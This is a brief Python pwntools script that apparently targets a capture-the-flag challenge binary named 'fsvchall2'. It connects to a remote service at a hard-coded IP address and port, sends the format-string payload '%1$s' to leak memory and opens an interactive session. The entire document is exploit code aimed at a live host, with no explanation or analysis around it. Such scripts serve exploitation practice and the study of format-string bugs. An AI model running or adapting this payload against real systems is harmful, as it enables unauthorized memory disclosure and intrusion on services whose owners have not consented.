#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./fsvchall2', checksec=False)
p = remote('18.226.103.146', 9002)
p.sendline(b'%1$s')
p.interactive()